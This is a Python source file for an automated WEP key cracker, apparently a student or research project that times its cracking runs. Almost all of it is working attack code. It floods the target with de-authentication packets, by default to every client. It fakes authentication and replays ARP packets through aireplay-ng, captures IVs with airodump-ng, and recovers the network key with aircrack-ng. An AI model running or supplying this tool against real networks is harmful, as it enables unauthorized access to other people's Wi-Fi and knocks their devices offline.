# Automatic wep cracker
# Copyright (C) 2021  Tyson Steele, Neilesh Chander, Ryan Kane

# This program is free software: you can redistribute it and/or modify
# it under the terms of the GNU General Public License as published by
# the Free Software Foundation, either version 3 of the License, or
# (at your option) any later version.

# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
# GNU General Public License for more details.


from scapy.all import *
from argparse import ArgumentParser as AP
import subprocess
import multiprocessing as mp
import shlex
import time
import csv
import os
import signal


# T1: Keep attempting to get ARP packets until success; Terminated by T3
def getARP(cmd_str, target, accessPoint, interface, deauthCount, conn):
    aireplay = subprocess.Popen(cmd_str, stdout=subprocess.PIPE)
    dd = subprocess.Popen(['dd', 'of=aireplay_output.txt'], stdin=aireplay.stdout, stderr=subprocess.PIPE)
    aireplay.stdout.close()
    pid = aireplay.pid
    conn.send(pid)
    conn.close()

    got_arp = False
    print('Commencing de-auth attack...')
    while not got_arp:
        time.sleep(5)
        f = open('aireplay_output.txt', 'r')
        for line in f:
            if 'ARP requests and' in line:
                if 'got 0 ARP requests' in line:
                    continue
                else:
                    got_arp = True
                    break
        if not got_arp:
            # Send de-auth packets
            dot11 = Dot11(addr1=target, addr2=accessPoint, addr3=accessPoint)
            deauth_packet = RadioTap()/dot11/Dot11Deauth()
            sendp(deauth_packet, iface=interface, count=deauthCount, inter=0.100, verbose=0)


# T2: Function to run subprocess.Popen(cmd_airodump) as async; terminated by T3
def runairodump(cmd_str, conn):
    airodump = subprocess.Popen(cmd_str, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
    pid = airodump.pid
    conn.send(pid)
    conn.close()


# T3: Check if we have enough IVs to terminate first two child processes
def get_enough_iv(e,n, iv_stop):
    # Continue checking if we have enough ivs, kill T1 and T2 when we do
    while not e.is_set():
        try:
            csv_file = open('output-01.csv')
            csv_reader = csv.reader(csv_file, delimiter=',')
            line_count = 0

            for row in csv_reader:
                if line_count == 2:
                    n.value = int(row[10])
                    line_count += 1

                else: line_count += 1
            if n.value >= iv_stop: e.set()
        except: 
            continue
    print('Number of IVs obtained, now running aircrack...')


def handler(signum, frame):
    global pid_aircrack
    global time_taken

    print('Gracefully exiting and killing aircrack process...')
    print(f'Time taken in seconds: {time_taken}')
    os.kill(pid_aircrack, signal.SIGKILL)
    latest_test = 0
    for filename in os.scandir('cap_files'):
        latest_test = int(filename.name.split('.')[0])
    for filename in os.scandir("."):
        if filename.name == 'output-01.cap':
            try:
                os.rename('output-01.cap', f'cap_files/{latest_test + 1}.cap')
                continue
            except:
                pass

# Main program elements
if __name__ == "__main__":
    global pid_aircrack
    global time_taken
    start = time.time()

    # setup command line options, flags, and help
    parser = AP(description="Capture ARP packets, exctract the RC4 keystreams, and crack the WEP key.")
    parser.add_argument("-i", "--interface", help="interface to sniff and send packets from", required=True)
    parser.add_argument("-a", "--access_point", help="MAC address of the access point, also known as the BSSID of the network.", required=True)
    parser.add_argument("-s", "--source", help="MAC address of the device injecting the packets. run ifconfig to find it", required=True)
    parser.add_argument("-c", "--channel", help="Channel that target network is operation on.", required=True)
    parser.add_argument("-r", "--captured_arp_packets", help="Number of IVs to capture before attempting to crack password.", required=True)
    parser.add_argument("-p", "--packets", help="packets per second to inject", default=500)
    parser.add_argument("-t", "--target", help="MAC address of the target device for the de-auth attack, default is broadcast", default='ff:ff:ff:ff:ff:ff')
    parser.add_argument("-n", "--number_deauth", help="Number of de-auth packets to send per batch", default=25)

    # Get command line argument values
    args = parser.parse_args()
    iface = args.interface
    access_point = args.access_point
    source_mac = args.source
    network_channel = args.channel
    packet_capture_count = args.captured_arp_packets
    packets_per_second = args.packets
    de_auth_target = args.target
    de_auth_packet_count = args.number_deauth

    # Setup command syntax using command line args provided
    cmd_fake_auth = shlex.split(f'aireplay-ng --fakeauth 0 -a {access_point} -h {source_mac} {iface}')
    cmd_arpreplay = shlex.split(f'aireplay-ng --arpreplay -b {access_point} -h {source_mac} -x {packets_per_second} {iface}')
    cmd_airodump = shlex.split(f'airodump-ng {iface} --bssid {access_point} --channel {network_channel} --write output')
    cmd_aircrack = shlex.split('aircrack-ng output-01.cap')

    # Run initial check to determine if target network can be reached
    fake_auth = subprocess.Popen(cmd_fake_auth, stdout = subprocess.PIPE)

    # Thread #1: get ARP packets; Terminated by T3 completion
    parent_aire_conn, child_aire_conn = mp.Pipe()
    process_getARP = mp.Process(target=getARP, args=(cmd_arpreplay,de_auth_target, access_point, iface, de_auth_packet_count, child_aire_conn))
    process_getARP.start()
    pid_aireplay = parent_aire_conn.recv()
    parent_aire_conn.close()

    # Thread #2: Run the dump; terminated by T3 completion
    parent_airo_conn, child_airo_conn = mp.Pipe()
    process_runairodump = mp.Process(target=runairodump, args=(cmd_airodump,child_airo_conn))
    process_runairodump.start()
    pid_airodump = parent_airo_conn.recv()
    parent_airo_conn.close()

    # Thead #3: Wait until we have sufficient IVs then terminate T1 and T2
    num_ivs = mp.Value('i', 0)
    enough_ivs = mp.Event()

    # Setup and start process
    process_get_enough_ivs = mp.Process(target=get_enough_iv, args=(enough_ivs, num_ivs, int(packet_capture_count)))
    process_get_enough_ivs.start()

    # Join, so the function is now blocking; Make parent wait for completion
    process_get_enough_ivs.join()

    # Once T3 exits, flag must be set, so we kill T1 and T2
    process_getARP.join()
    process_getARP.close()
    os.kill(pid_airodump, signal.SIGKILL)
    process_runairodump.join()
    process_runairodump.close()
    os.kill(pid_aireplay, signal.SIGKILL)
    process_get_enough_ivs.close()

    signal.signal(signal.SIGINT, handler)

    # File cleanup
    files = ['aireplay_output.txt', 'output-01.csv', 'output-01.kismet.csv', 'output-01.kismet.netxml', 'output-01.log.csv']
    pattern = re.compile(r"replay_arp-[0-9]+-[0-9]+\.cap")
    for filename in os.scandir("."):
        if filename.name in files:
            try: os.remove(filename)
            except: pass
        elif pattern.match(filename.name):
            try: os.remove(filename)
            except: pass
    
    end = time.time()
    time_taken = end-start
    print(f'Time taken in seconds: {time_taken}')

    # Run AirCrack-ng using captured data; Continuing attack on parent process
    aircrack = subprocess.Popen(cmd_aircrack)
    pid_aircrack = aircrack.pid
    # Wait 17 minutes so that the program doesn't terminate before aircrack is finished
    try:
        aircrack.wait(1000)
    except subprocess.TimeoutExpired:
        # In case the 17 minutes runs out automatically
        print('Time ran out, killing aircrack and logging time...')
        print(f'Time taken in seconds: {time_taken}')
        os.kill(pid_aircrack, signal.SIGKILL)
        latest_test = 0
        for filename in os.scandir('cap_files'):
            latest_test = int(filename.name.split('.')[0])
        for filename in os.scandir("."):
            if filename.name == 'output-01.cap':
                try:
                    os.rename('output-01.cap', f'cap_files/{latest_test + 1}.cap')
                    continue
                except:
                    pass
    # In case aircrack finds the key (different behaviour)
    for filename in os.scandir('cap_files'):
            latest_test = int(filename.name.split('.')[0])
    for filename in os.scandir("."):
        if filename.name == 'output-01.cap':
            try:
                os.rename('output-01.cap', f'cap_files/{latest_test + 1}.cap')
                continue
            except:
                pass
